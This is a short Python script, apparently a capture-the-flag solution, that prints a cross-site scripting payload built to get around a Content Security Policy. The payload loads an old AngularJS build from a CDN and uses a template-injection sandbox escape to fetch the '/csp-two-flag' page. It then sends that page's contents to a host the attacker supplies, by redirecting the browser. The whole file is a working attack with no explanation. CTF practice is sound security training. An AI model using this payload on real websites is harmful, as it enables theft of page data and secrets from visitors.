import sys
import base64

if len(sys.argv) != 2:
	print('python solution.py http://www.example.com')
else:  
	destination = sys.argv[1]
	print('Here is the XSS payload:\n')
	print('<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js"></script><p ng-app>{{constructor.constructor(\'fetch("/csp-two-flag").then(x=>x.text()).then(x=>location="' + destination + '?q="+escape(x))\')()}}')